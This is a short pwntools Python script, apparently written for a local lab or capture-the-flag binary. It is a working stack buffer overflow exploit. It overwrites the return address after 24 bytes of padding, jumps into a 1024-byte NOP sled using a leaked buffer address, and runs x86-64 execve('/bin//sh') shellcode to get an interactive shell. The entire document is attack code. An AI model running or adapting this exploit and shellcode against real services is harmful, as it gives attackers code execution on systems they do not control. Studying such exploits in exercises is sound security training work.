from pwn import *

shellcode = b'\x48\x31\xC0\x48\x31\xD2\x52\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x53\x48\x89\xE7\x52\x57\x48\x89\xE6\xB0\x3B\x0F\x05' 
# https://github.com/Nathan-Huckleberry/shellcodes/blob/master/multiuse/x86-64-execve-no-assume

padding = 24* b'a' # from gdb, we found that overwriting 24 bytes is necessary to get to the return address

nopsled = 1024 * asm(shellcraft.amd64.nop())

e = ELF('a.out')
p = remote('localhost', port=9006)

buf_location = int(p.readline(), 16)

ret_addr = buf_location + 24 + 512 # 24 bytes for the buffer itself, 512 bytes to jump into the middle of the nop sled

p.sendline(padding + p64(ret_addr) + nopsled + shellcode)

p.interactive()